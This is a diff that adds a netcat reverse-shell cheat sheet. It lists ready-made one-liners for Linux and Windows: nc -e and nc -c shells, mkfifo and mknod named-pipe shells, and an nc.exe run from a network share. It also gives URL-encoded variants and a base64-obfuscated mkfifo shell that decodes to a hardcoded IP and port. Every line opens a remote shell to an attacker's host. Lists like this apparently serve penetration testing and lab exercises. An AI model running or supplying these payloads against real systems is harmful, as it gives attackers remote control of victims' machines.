@@ -1,0 +1,16 @@
+Netcat Linux
+nc -e /bin/sh $IP $PORT
+nc -e /bin/bash $IP $PORT
+nc -c /bin/sh $IP $PORT
+nc -c /bin/bash $IP $PORT
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
+rm -f backpipe; mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc $IP $PORT 1>/tmp/backpipe
+rm -f backpipe; mknod /tmp/backpipe p && nc $IP $PORT 0<backpipe | /bin/bash 1>backpipe
+Netcat Windows
+nc.exe -e cmd $IP $PORT
+\\$IP\a\nc.exe -e cmd $IP $PORT
+Netcat URL Encoding
+nc%20-e%20%2Fbin%2Fsh%20$IP%20$PORT
+rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20$IP%20$PORT%20%3E%2Ftmp%2Ff
+Netcat Base64 Encoding
+echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xLjE4IDQ0MyA+L3RtcC9mCg==" | base64 -d | sh (change.ip.and.port)
